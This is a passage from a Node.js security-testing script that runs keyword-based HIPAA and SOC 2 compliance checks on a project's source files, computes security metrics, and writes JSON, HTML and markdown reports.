              verification: 'Verify security events are logged'
            });
            break;
        }
      });
    });

    return suggestions;
  }

  async runComplianceValidationTests() {
    console.log('📋 6. Running compliance validation tests...');
    
    const category = this.testResults.test_categories.compliance_validation;
    let score = 50; // Base score

    try {
      // Test HIPAA compliance requirements
      const hipaaCompliance = await this.testHIPAACompliance();
      category.tests.push({
        name: 'HIPAA Compliance Validation',
        status: hipaaCompliance.compliant ? 'COMPLIANT' : 'NON_COMPLIANT',
        details: hipaaCompliance.details
      });

      if (hipaaCompliance.compliant) {
        score += 30;
      } else {
        category.findings.push({
          compliance_issue: 'HIPAA Non-Compliance',
          description: 'HIPAA compliance requirements not met',
          missing_controls: hipaaCompliance.missing_controls,
          remediation_timeline: '30 days'
        });
      }

      // Test SOC 2 compliance
      const soc2Compliance = await this.testSOC2Compliance();
      category.tests.push({
        name: 'SOC 2 Compliance Validation',
        status: soc2Compliance.compliant ? 'COMPLIANT' : 'NEEDS_IMPROVEMENT',
        details: soc2Compliance.details
      });

      if (soc2Compliance.compliant) {
        score += 20;
      }

    } catch (error) {
      category.findings.push({
        compliance_issue: 'Compliance Validation Error',
        description: `Compliance validation failed: ${error.message}`
      });
      score = 30;
    }

    category.score = score;
    console.log(`   Score: ${category.score}/100`);
  }

  async testHIPAACompliance() {
    // This would integrate with the HIPAA compliance validator
    // For now, simulate basic checks
    
    const encryptionFiles = this.findSourceFiles(['.js', '.ts', '.jsx', '.tsx'])
      .filter(file => {
        const content = fs.readFileSync(file, 'utf8').toLowerCase();
        return content.includes('encrypt') && content.includes('phi');
      });

    const auditFiles = this.findSourceFiles(['.js', '.ts', '.jsx', '.tsx'])
      .filter(file => {
        const content = fs.readFileSync(file, 'utf8').toLowerCase();
        return content.includes('audit') || content.includes('log');
      });

    const compliant = encryptionFiles.length > 0 && auditFiles.length > 0;
    const missingControls = [];

    if (encryptionFiles.length === 0) {
      missingControls.push('PHI Encryption');
    }
    if (auditFiles.length === 0) {
      missingControls.push('Audit Logging');
    }

    return {
      compliant,
      details: [
        `PHI encryption: ${encryptionFiles.length > 0 ? 'Implemented' : 'Missing'}`,
        `Audit logging: ${auditFiles.length > 0 ? 'Implemented' : 'Missing'}`
      ],
      missing_controls: missingControls
    };
  }

  async testSOC2Compliance() {
    // Basic SOC 2 compliance checks
    const accessControlFiles = this.findSourceFiles(['.js', '.ts', '.jsx', '.tsx'])
      .filter(file => {
        const content = fs.readFileSync(file, 'utf8').toLowerCase();
        return content.includes('role') && content.includes('access');
      });

    const monitoringFiles = this.findSourceFiles(['.js', '.ts', '.jsx', '.tsx'])
      .filter(file => {
        const content = fs.readFileSync(file, 'utf8').toLowerCase();
        return content.includes('monitor') || content.includes('alert');
      });

    const score = (accessControlFiles.length > 0 ? 50 : 0) + (monitoringFiles.length > 0 ? 50 : 0);

    return {
      compliant: score >= 80,
      details: [
        `Access controls: ${accessControlFiles.length > 0 ? 'Implemented' : 'Missing'}`,
        `Monitoring: ${monitoringFiles.length > 0 ? 'Implemented' : 'Missing'}`
      ]
    };
  }

  async generateSecurityMetrics() {
    console.log('📊 Generating security metrics...');

    this.testResults.security_metrics = {
      vulnerability_density: this.calculateVulnerabilityDensity(),
      security_coverage: this.calculateSecurityCoverage(),
      compliance_score: this.calculateComplianceScore(),
      remediation_time: this.calculateRemediationTime(),
      security_trend: this.calculateSecurityTrend()
    };
  }

  calculateVulnerabilityDensity() {
    const totalVulnerabilities = Object.values(this.testResults.test_categories)
      .reduce((sum, category) => sum + category.findings.length, 0);
    
    const sourceFiles = this.findSourceFiles(['.js', '.ts', '.jsx', '.tsx']).length;
    
    return {
      vulnerabilities_per_file: sourceFiles > 0 ? (totalVulnerabilities / sourceFiles).toFixed(2) : 0,
      total_vulnerabilities: totalVulnerabilities,
      total_files: sourceFiles
    };
  }

  calculateSecurityCoverage() {
    const totalTests = Object.values(this.testResults.test_categories)
      .reduce((sum, category) => sum + category.tests.length, 0);
    
    const passedTests = Object.values(this.testResults.test_categories)
      .reduce((sum, category) => {
        return sum + category.tests.filter(t => 
          t.status === 'SECURE' || t.status === 'COMPLIANT' || t.status === 'IMPLEMENTED'
        ).length;
      }, 0);

    return {
      coverage_percentage: totalTests > 0 ? ((passedTests / totalTests) * 100).toFixed(1) : 0,
      passed_tests: passedTests,
      total_tests: totalTests
    };
  }

  calculateComplianceScore() {
    const totalScore = Object.values(this.testResults.test_categories)
      .reduce((sum, category) => sum + category.score, 0);
    
    const maxScore = Object.values(this.testResults.test_categories)
      .reduce((sum, category) => sum + category.max, 0);

    return {
      overall_score: maxScore > 0 ? Math.round((totalScore / maxScore) * 100) : 0,
      category_scores: Object.entries(this.testResults.test_categories)
        .reduce((scores, [name, category]) => {
          scores[name] = `${category.score}/${category.max}`;
          return scores;
        }, {})
    };
  }

  calculateRemediationTime() {
    const highSeverityFindings = Object.values(this.testResults.test_categories)
      .flatMap(category => category.findings)
      .filter(finding => 
        finding.severity === 'CRITICAL' || finding.severity === 'HIGH'
      );

    return {
      immediate_attention_required: highSeverityFindings.length,
      estimated_remediation_days: highSeverityFindings.length * 2, // 2 days per high/critical issue
      priority_order: highSeverityFindings.map((finding, index) => ({
        rank: index + 1,
        issue: finding.vulnerability || finding.issue,
        severity: finding.severity || 'HIGH'
      }))
    };
  }

  calculateSecurityTrend() {
    // This would typically compare with previous test runs
    // For now, return current state
    return {
      trend: 'stable',
      improvement_areas: ['Automated remediation', 'Security monitoring'],
      strengths: ['Penetration testing', 'Compliance validation']
    };
  }

  async generateSecurityTestingReport() {
    const reportDir = path.join(this.projectRoot, 'security-reports');
    if (!fs.existsSync(reportDir)) {
      fs.mkdirSync(reportDir, { recursive: true });
    }

    const timestamp = new Date().toISOString().replace(/[:.]/g, '-');
    
    // Generate JSON report
    const jsonReportPath = path.join(reportDir, `automated-security-testing-${timestamp}.json`);
    fs.writeFileSync(jsonReportPath, JSON.stringify(this.testResults, null, 2));

    // Generate HTML report
    const htmlReport = this.generateHTMLSecurityTestingReport();
    const htmlReportPath = path.join(reportDir, `automated-security-testing-${timestamp}.html`);
    fs.writeFileSync(htmlReportPath, htmlReport);

    // Generate executive summary
    const executiveSummary = this.generateExecutiveSummary();
    const summaryPath = path.join(reportDir, `security-testing-executive-summary-${timestamp}.md`);
    fs.writeFileSync(summaryPath, executiveSummary);

    // Calculate overall score
    this.testResults.overall_score = this.testResults.security_metrics.compliance_score.overall_score;
    
    if (this.testResults.overall_score >= 90) {
      this.testResults.security_level = 'excellent';
    } else if (this.testResults.overall_score >= 75) {
      this.testResults.security_level = 'good';
    } else if (this.testResults.overall_score >= 60) {
      this.testResults.security_level = 'needs-improvement';
    } else {
      this.testResults.security_level = 'critical';
    }

    console.log(`\n🛡️  Security Testing Report Generated:`);
    console.log(`   JSON: ${jsonReportPath}`);
    console.log(`   HTML: ${htmlReportPath}`);
    console.log(`   Executive Summary: ${summaryPath}`);
    console.log(`\n🎯 Overall Security Score: ${this.testResults.overall_score}/100`);
    console.log(`   Security Level: ${this.testResults.security_level.toUpperCase()}`);
    console.log(`   Vulnerabilities Found: ${this.testResults.security_metrics.vulnerability_density.total_vulnerabilities}`);
  }

  generateHTMLSecurityTestingReport() {
    const statusColor = this.getSecurityLevelColor(this.testResults.overall_score);
    
    return `
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Automated Security Testing Report</title>
    <style>
        body { font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif; margin: 20px; background: #f5f5f5; }
        .container { max-width: 1400px; margin: 0 auto; background: white; padding: 30px; border-radius: 12px; box-shadow: 0 4px 20px rgba(0,0,0,0.1); }
        .header { text-align: center; margin-bottom: 40px; }
        .security-score { font-size: 72px; font-weight: bold; color: ${statusColor}; margin: 20px 0; }
        .security-level { display: inline-block; padding: 12px 24px; border-radius: 30px; color: white; background: ${statusColor}; font-weight: bold; text-transform: uppercase; font-size: 18px; }
        .metrics-grid { display: grid; grid-template-columns: repeat(auto-fit, minmax(250px, 1fr)); gap: 20px; margin: 30px 0; }
        .metric-card { padding: 20px; background: #f8f9fa; border-radius: 10px; border-left: 4px solid #007bff; }
        .metric-value { font-size: 32px; font-weight: bold; color: #007bff; }
        .test-category { margin: 30px 0; padding: 25px; background: #f8f9fa; border-radius: 10px; }
        .category-header { display: flex; justify-content: space-between; align-items: center; margin-bottom: 20px; }
        .category-score { font-size: 28px; font-weight: bold; }
        .test-result { margin: 15px 0; padding: 15px; background: white; border-radius: 8px; border-left: 4px solid #28a745; }
        .vulnerable { border-left-color: #dc3545; }
        .needs-improvement { border-left-color: #ffc107; }
        .finding { margin: 10px 0; padding: 15px; background: #fff3cd; border-left: 4px solid #ffc107; border-radius: 5px; }
        .critical-finding { background: #f8d7da; border-left-color: #dc3545; }
        .threat-intelligence { background: #e3f2fd; padding: 20px; border-radius: 10px; margin: 20px 0; }
        .remediation-suggestion { background: #d4edda; padding: 15px; margin: 10px 0; border-radius: 5px; border-left: 4px solid #28a745; }
    </style>
</head>
<body>
    <div class="container">
        <div class="header">
            <h1>🛡️ Automated Security Testing Report</h1>
            <div class="security-score">${this.testResults.overall_score}/100</div>
            <div class="security-level">${this.testResults.security_level.replace(/-/g, ' ')}</div>
            <p><strong>Generated:</strong> ${this.testResults.timestamp}</p>
            <p><strong>Target:</strong> ${this.targetURL}</p>
        </div>

        <div class="metrics-grid">
            <div class="metric-card">
                <h3>🎯 Security Coverage</h3>
                <div class="metric-value">${this.testResults.security_metrics.security_coverage.coverage_percentage}%</div>
                <p>${this.testResults.security_metrics.security_coverage.passed_tests}/${this.testResults.security_metrics.security_coverage.total_tests} tests passed</p>
            </div>
            <div class="metric-card">
                <h3>🐛 Vulnerability Density</h3>
                <div class="metric-value">${this.testResults.security_metrics.vulnerability_density.vulnerabilities_per_file}</div>
                <p>vulnerabilities per file</p>
            </div>
            <div class="metric-card">
                <h3>⏱️ Remediation Time</h3>
                <div class="metric-value">${this.testResults.security_metrics.remediation_time.estimated_remediation_days}</div>
                <p>estimated days to fix</p>
            </div>
            <div class="metric-card">
                <h3>🚨 Critical Issues</h3>
                <div class="metric-value" style="color: #dc3545;">${this.testResults.security_metrics.remediation_time.immediate_attention_required}</div>
                <p>require immediate attention</p>
            </div>
        </div>

        ${Object.entries(this.testResults.test_categories).map(([name, category]) => `
            <div class="test-category">
                <div class="category-header">
                    <h2>${name.replace(/_/g, ' ').toUpperCase()}</h2>
                    <div class="category-score" style="color: ${this.getScoreColor(category.score)}">${category.score}/${category.max}</div>
                </div>
                
                <h4>🧪 Test Results (${category.tests.length})</h4>
                ${category.tests.map(test => `
                    <div class="test-result ${test.status === 'VULNERABLE' ? 'vulnerable' : test.status.includes('NEEDS') ? 'needs-improvement' : ''}">
                        <strong>${test.name}</strong> - ${test.status}
                        <ul>
                            ${test.details.map(detail => `<li>${detail}</li>`).join('')}
                        </ul>
                    </div>
                `).join('')}
                
                ${category.findings.length > 0 ? `
                    <h4>⚠️ Security Findings (${category.findings.length})</h4>
                    ${category.findings.map(finding => `
                        <div class="finding ${finding.severity === 'CRITICAL' ? 'critical-finding' : ''}">
                            <strong>${finding.vulnerability || finding.issue || finding.threat}</strong>
                            ${finding.severity ? ` - ${finding.severity}` : ''}
                            <p>${finding.description}</p>
                            ${finding.remediation ? `<small><strong>Remediation:</strong> ${finding.remediation}</small>` : ''}
                        </div>
                    `).join('')}
                ` : '<p>✅ No security findings in this category</p>'}
            </div>
        `).join('')}

        ${this.testResults.threat_intelligence ? `
            <div class="threat-intelligence">
                <h2>🎯 Threat Intelligence</h2>
                <h4>Threat Actors Identified: ${this.testResults.threat_intelligence.threat_actors?.length || 0}</h4>
                <h4>Attack Vectors: ${this.testResults.threat_intelligence.attack_vectors?.length || 0}</h4>
                ${this.testResults.threat_intelligence.risk_assessment ? `
                    <p><strong>Overall Risk Level:</strong> ${this.testResults.threat_intelligence.risk_assessment.overall_risk_level}</p>
                    <p><strong>High-Risk Scenarios:</strong> ${this.testResults.threat_intelligence.risk_assessment.high_risk_scenarios.length}</p>
                ` : ''}
            </div>
        ` : ''}

        ${this.testResults.remediation_suggestions.length > 0 ? `
            <div style="margin-top: 40px;">
                <h2>🔧 Automated Remediation Suggestions</h2>
                ${this.testResults.remediation_suggestions.map(suggestion => `
                    <div class="remediation-suggestion">
                        <strong>${suggestion.vulnerability}</strong> - ${suggestion.priority} Priority
                        <p><strong>Automated Fix:</strong> <code>${suggestion.automated_fix}</code></p>
                        <p><strong>Manual Steps:</strong></p>
                        <ul>
                            ${suggestion.manual_steps.map(step => `<li>${step}</li>`).join('')}
                        </ul>
                        <p><small><strong>Verification:</strong> ${suggestion.verification}</small></p>
                    </div>
                `).join('')}
            </div>
        ` : ''}

        <div style="margin-top: 40px; padding: 25px; background: #d1ecf1; border-radius: 10px;">
            <h3>📊 Executive Summary</h3>
            <p><strong>Overall Security Score:</strong> ${this.testResults.overall_score}/100</p>
            <p><strong>Security Level:</strong> ${this.testResults.security_level.toUpperCase()}</p>
            <p><strong>Total Vulnerabilities:</strong> ${this.testResults.security_metrics.vulnerability_density.total_vulnerabilities}</p>
            <p><strong>Security Coverage:</strong> ${this.testResults.security_metrics.security_coverage.coverage_percentage}%</p>
            <p><strong>Immediate Action Items:</strong> ${this.testResults.security_metrics.remediation_time.immediate_attention_required}</p>
        </div>
    </div>
</body>
</html>`;
  }

  generateExecutiveSummary() {
    const summary = [];
    
    summary.push('# Executive Security Testing Summary\n');
    summary.push(`**Generated:** ${this.testResults.timestamp}`);
    summary.push(`**Overall Security Score:** ${this.testResults.overall_score}/100`);
    summary.push(`**Security Level:** ${this.testResults.security_level.toUpperCase()}\n`);

    // Key metrics
    summary.push('## 📊 Key Security Metrics\n');
    summary.push(`- **Security Coverage:** ${this.testResults.security_metrics.security_coverage.coverage_percentage}%`);
    summary.push(`- **Vulnerability Density:** ${this.testResults.security_metrics.vulnerability_density.vulnerabilities_per_file} per file`);
    summary.push(`- **Total Vulnerabilities:** ${this.testResults.security_metrics.vulnerability_density.total_vulnerabilities}`);
    summary.push(`- **Estimated Remediation Time:** ${this.testResults.security_metrics.remediation_time.estimated_remediation_days} days`);
    summary.push(`- **Critical Issues:** ${this.testResults.security_metrics.remediation_time.immediate_attention_required}\n`);

    // Test category results
    summary.push('## 🧪 Test Category Results\n');
    Object.entries(this.testResults.test_categories).forEach(([name, category]) => {
      summary.push(`### ${name.replace(/_/g, ' ').toUpperCase()}`);
      summary.push(`- **Score:** ${category.score}/${category.max}`);
      summary.push(`- **Tests Run:** ${category.tests.length}`);
      summary.push(`- **Findings:** ${category.findings.length}`);
      
      if (category.findings.length > 0) {
        summary.push('- **Key Issues:**');
        category.findings.slice(0, 3).forEach(finding => {
          summary.push(`  - ${finding.vulnerability || finding.issue || finding.threat}`);
        });
      }
      summary.push('');
    });

    // Priority remediation actions
    if (this.testResults.security_metrics.remediation_time.immediate_attention_required > 0) {
      summary.push('## 🚨 Immediate Action Required\n');
      this.testResults.security_metrics.remediation_time.priority_order.slice(0, 5).forEach(item => {
        summary.push(`${item.rank}. **${item.issue}** (${item.severity})`);
      });
      summary.push('');
    }

    // Recommendations
    summary.push('## 💡 Strategic Recommendations\n');
    summary.push('1. **Implement Automated Security Scanning** - Integrate security tests into CI/CD pipeline');
    summary.push('2. **Establish Security Monitoring** - Set up real-time security event monitoring');
    summary.push('3. **Regular Penetration Testing** - Conduct quarterly external security assessments');
    summary.push('4. **Security Training Program** - Implement developer security awareness training');
    summary.push('5. **Incident Response Plan** - Develop and test security incident response procedures');

    return summary.join('\n');
  }

  getSecurityLevelColor(score) {
    if (score >= 90) return '#28a745';
    if (score >= 75) return '#17a2b8';
    if (score >= 60) return '#ffc107';
    return '#dc3545';
  }

  getScoreColor(score) {
    if (score >= 90) return '#28a745';
    if (score >= 75) return '#17a2b8';
    if (score >= 60) return '#ffc107';
    return '#dc3545';
  }

  // Utility methods
  async makeRequest(url, options = {}) {
    return new Promise((resolve, reject) => {
      const urlObj = new URL(url);
      const requestOptions = {
        hostname: urlObj.hostname,
        port: urlObj.port || 443,
        path: urlObj.pathname + urlObj.search,
        method: options.method || 'GET',
        headers: options.headers || {},
        timeout: options.timeout || 10000
      };

      const req = https.request(requestOptions, (res) => {
        let body = '';
        res.on('data', chunk => body += chunk);
        res.on('end', () => resolve({ statusCode: res.statusCode, headers: res.headers, body }));
      });

      req.on('error', reject);
      req.on('timeout', () => {
        req.destroy();
        reject(new Error('Request timeout'));
      });

      if (options.body) {
        req.write(options.body);
      }
      req.end();
    });
  }

  findSourceFiles(extensions) {
    const files = [];
    const searchDir = (dir) => {
      try {
        const items = fs.readdirSync(dir);
        for (const item of items) {
          const fullPath = path.join(dir, item);
          const stat = fs.statSync(fullPath);
          
          if (stat.isDirectory() && !item.startsWith('.') && item !== 'node_modules') {
            searchDir(fullPath);
          } else if (stat.isFile() && extensions.some(ext => item.endsWith(ext))) {
            files.push(fullPath);
          }
        }
      } catch (error) {
        // Skip directories we can't read
      }
    };
    
    searchDir(this.projectRoot);
    return files.slice(0, 200); // Limit to prevent memory issues
  }

  findFiles(filenames) {
    const files = [];
    const searchDirs = [
      this.projectRoot,
      path.join(this.projectRoot, 'scripts'),
      path.join(this.projectRoot, 'security'),
      path.join(this.projectRoot, 'tools')
    ];
    
    searchDirs.forEach(dir => {
      if (fs.existsSync(dir)) {
        filenames.forEach(filename => {
          const filePath = path.join(dir, filename);
          if (fs.existsSync(filePath)) {
            files.push(filePath);
          }
        });
      }
    });
    
    return files;
  }

  findDocumentationFiles(filenames) {
    const files = [];
    const searchDirs = [
      this.projectRoot,
      path.join(this.projectRoot, 'docs'),
      path.join(this.projectRoot, 'documentation'),
      path.join(this.projectRoot, 'security')
    ];
    
    searchDirs.forEach(dir => {
      if (fs.existsSync(dir)) {
        filenames.forEach(filename => {
          const filePath = path.join(dir, filename);
          if (fs.existsSync(filePath)) {
            files.push(filePath);
          }
        });
      }
    });
    
    return files;
  }
}

// Main execution
async function main() {
  const securityTesting = new AutomatedSecurityTesting();
  await securityTesting.runAutomatedSecurityTesting();
}

// Run if executed directly
if (require.main === module) {
  main().catch(error => {
    console.error('❌ Automated security testing failed:', error);
    process.exit(1);
  });
}

module.exports = { AutomatedSecurityTesting };